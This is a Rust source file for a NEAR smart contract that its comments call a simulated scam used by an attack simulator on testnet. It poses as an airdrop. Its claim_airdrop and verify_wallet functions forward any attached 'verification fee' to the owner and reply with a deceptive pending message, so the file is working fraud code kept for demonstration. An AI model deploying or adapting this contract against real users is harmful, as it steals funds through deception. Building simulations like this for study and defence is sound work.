//! Simulated scam contract used by the Leukonet attack simulator on testnet.
//!
//! It poses as an airdrop: anyone who "claims" with a small fee sends that fee
//! straight to the owner. Written against the raw NEAR host functions (no SDK)
//! so it is under 1 KB and costs almost nothing to deploy for each demo run.
//!
//! `new` takes the owner account id as raw (non-JSON) input bytes.
#![no_std]

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    core::arch::wasm32::unreachable()
}

#[link(wasm_import_module = "env")]
extern "C" {
    fn input(register_id: u64);
    fn register_len(register_id: u64) -> u64;
    fn read_register(register_id: u64, ptr: u64);
    fn storage_write(key_len: u64, key_ptr: u64, value_len: u64, value_ptr: u64, register_id: u64) -> u64;
    fn storage_read(key_len: u64, key_ptr: u64, register_id: u64) -> u64;
    fn attached_deposit(balance_ptr: u64);
    fn promise_batch_create(account_id_len: u64, account_id_ptr: u64) -> u64;
    fn promise_batch_action_transfer(promise_index: u64, amount_ptr: u64);
    fn value_return(value_len: u64, value_ptr: u64);
    fn panic_utf8(len: u64, ptr: u64) -> !;
}

const OWNER_KEY: &[u8] = b"owner";
const REPLY: &[u8] = b"\"Airdrop pending verification\"";
static mut BUF: [u8; 64] = [0; 64];
static mut AMOUNT: [u8; 16] = [0; 16];

fn fail(msg: &[u8]) -> ! {
    unsafe { panic_utf8(msg.len() as u64, msg.as_ptr() as u64) }
}

#[no_mangle]
pub extern "C" fn new() {
    unsafe {
        if storage_read(OWNER_KEY.len() as u64, OWNER_KEY.as_ptr() as u64, 1) == 1 {
            fail(b"already initialized");
        }
        input(0);
        let len = register_len(0);
        if len == 0 || len > 64 {
            fail(b"owner account id required");
        }
        let buf = core::ptr::addr_of_mut!(BUF) as u64;
        read_register(0, buf);
        storage_write(OWNER_KEY.len() as u64, OWNER_KEY.as_ptr() as u64, len, buf, 2);
    }
}

/// "Pay a small verification fee to unlock your airdrop."
#[no_mangle]
pub extern "C" fn claim_airdrop() {
    unsafe {
        if storage_read(OWNER_KEY.len() as u64, OWNER_KEY.as_ptr() as u64, 1) != 1 {
            fail(b"not initialized");
        }
        let len = register_len(1);
        let buf = core::ptr::addr_of_mut!(BUF) as u64;
        read_register(1, buf);
        let amount = core::ptr::addr_of_mut!(AMOUNT) as u64;
        attached_deposit(amount);
        let p = promise_batch_create(len, buf);
        promise_batch_action_transfer(p, amount);
        value_return(REPLY.len() as u64, REPLY.as_ptr() as u64);
    }
}

#[no_mangle]
pub extern "C" fn verify_wallet() {
    claim_airdrop()
}
